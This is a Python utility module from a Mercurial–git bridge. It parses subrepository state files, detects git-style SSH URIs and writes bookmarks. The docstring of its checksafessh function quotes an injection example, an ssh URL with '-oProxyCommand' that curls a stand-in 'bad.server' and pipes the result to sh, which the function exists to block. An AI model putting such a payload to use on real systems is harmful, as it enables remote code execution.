"""Compatibility functions for old Mercurial versions and other utility
functions."""

from __future__ import absolute_import, print_function

import re

try:
    from collections import OrderedDict
except ImportError:
    from ordereddict import OrderedDict

from dulwich import errors
from mercurial.i18n import _
from mercurial import (
    error,
    lock as lockmod,
)

from . import compat

gitschemes = (b'git', b'git+ssh', b'git+http', b'git+https')


def parse_hgsub(lines):
    """Fills OrderedDict with hgsub file content passed as list of lines"""
    rv = OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == b'#':
            continue
        name, value = l.split(b'=', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsub(data):
    """Produces a string from OrderedDict hgsub content"""
    return b''.join(b'%s = %s\n' % (n, v) for n, v in compat.iteritems(data))


def parse_hgsubstate(lines):
    """Fills OrderedDict with hgsubtate file content passed as list of lines"""
    rv = OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls[0] == b'#':
            continue
        value, name = l.split(b' ', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsubstate(data):
    """Produces a string from OrderedDict hgsubstate content"""
    return b''.join(b'%s %s\n' % (data[n], n) for n in sorted(data))


def transform_notgit(f):
    '''use as a decorator around functions that call into dulwich'''
    def inner(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except errors.NotGitRepository:
            raise error.Abort(b'not a git repository')
    return inner


def isgitsshuri(uri):
    """Method that returns True if a uri looks like git-style uri

    Tests:

    >>> print(isgitsshuri(b'http://fqdn.com/hg'))
    False
    >>> print(isgitsshuri(b'http://fqdn.com/test.git'))
    False
    >>> print(isgitsshuri(b'git@github.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'github-123.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'git@127.0.0.1:repo.git'))
    True
    >>> print(isgitsshuri(b'git@[2001:db8::1]:repository.git'))
    True
    """
    for scheme in gitschemes:
        if uri.startswith(b'%s://' % scheme):
            return False

    if uri.startswith(b'http:') or uri.startswith(b'https:'):
        return False

    m = re.match(br'(?:.+@)*([\[]?[\w\d\.\:\-]+[\]]?):(.*)', uri)
    if m:
        # here we're being fairly conservative about what we consider to be git
        # urls
        giturl, repopath = m.groups()
        # definitely a git repo
        if len(giturl) > 1 and repopath.endswith(b'.git'):
            return True
        # use a simple regex to check if it is a fqdn regex
        fqdn_re = (br'(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}'
                   br'(?<!-)\.)+[a-zA-Z]{2,63}$)')
        if re.match(fqdn_re, giturl):
            return True
    return False


def updatebookmarks(repo, changes, name=b'git_handler'):
    """abstract writing bookmarks for backwards compatibility"""
    bms = repo._bookmarks
    tr = lock = wlock = None
    try:
        wlock = repo.wlock()
        lock = repo.lock()
        tr = repo.transaction(name)
        bms.applychanges(repo, tr, changes)
        tr.close()
    finally:
        lockmod.release(tr, lock, wlock)


def checksafessh(host):
    """check if a hostname is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    host = compat.unquote(host)
    if host.startswith(b'-'):
        raise error.Abort(_(b"potentially unsafe hostname: '%s'") %
                          (host,))
